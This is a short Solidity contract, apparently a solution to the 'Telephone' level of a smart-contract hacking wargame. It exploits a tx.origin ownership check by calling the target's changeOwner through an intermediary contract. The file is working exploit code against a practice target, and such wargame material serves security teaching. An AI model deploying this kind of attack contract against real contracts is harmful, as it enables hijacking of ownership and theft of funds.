// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone cTelephone;

    constructor(address aTelephone) public {
        cTelephone = Telephone(aTelephone);
    }

    function callChangeOwner() public {
        cTelephone.changeOwner(msg.sender);
    }

    function telephoneOwner() public view returns (address) {
        return cTelephone.owner();
    }
}